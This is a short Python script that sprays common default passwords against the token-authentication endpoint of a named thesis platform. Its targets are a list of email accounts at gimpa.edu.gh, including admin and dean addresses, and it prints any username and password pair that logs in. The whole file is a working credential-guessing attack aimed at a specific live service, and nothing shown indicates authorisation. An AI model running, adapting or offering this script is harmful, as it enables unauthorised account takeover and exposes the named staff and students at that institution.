import requests

# Test known passwords on thesis.manamatechnologies.com
users = [
    "admin@gimpa.edu.gh",
    "kofi.mensah@gimpa.edu.gh",
    "kwame.boadu@adj.gimpa.edu.gh",
    "yaw.asante@gimpa.edu.gh",
    "abena.osei@gimpa.edu.gh",
    "john.smith@st.gimpa.edu.gh",
    "phd.candidate@st.gimpa.edu.gh",
    "josbudu@gimpa.edu.gh",
    "dean@gimpa.edu.gh",
]

passwords = ["Admin123!", "Password123!", "ChangeMe123!", "Student123!", "Gimpa123!", "admin", "password"]

for u in users:
    found = False
    for p in passwords:
        r = requests.post("https://thesis.manamatechnologies.com/api/v1/auth/token", data={"username": u, "password": p})
        if r.status_code == 200:
            print(f"User: {u} -> Password: {p}")
            found = True
            break
    if not found:
        print(f"User: {u} -> NOT FOUND in list")
